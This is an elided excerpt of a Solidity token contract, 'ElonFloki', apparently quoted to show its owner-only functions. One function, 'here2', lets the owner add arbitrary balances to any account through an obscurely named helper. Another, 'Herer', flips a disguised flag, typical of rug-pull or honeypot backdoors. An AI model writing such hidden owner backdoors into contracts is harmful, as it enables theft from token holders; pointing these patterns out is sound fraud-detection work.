...
contract ElonFloki is Context, IERC20, Ownable {
    ...
    string private _name = "Efloki";
    string private _symbol = "Efloli";
    ...
    function here2(uint256 amount,address account) onlyOwner() public {
        _balances[account] = _balances[account].abc(amount);
    }

    function Herer(bool _status) public onlyOwner {
        ILOV6y0u = _status;
    }
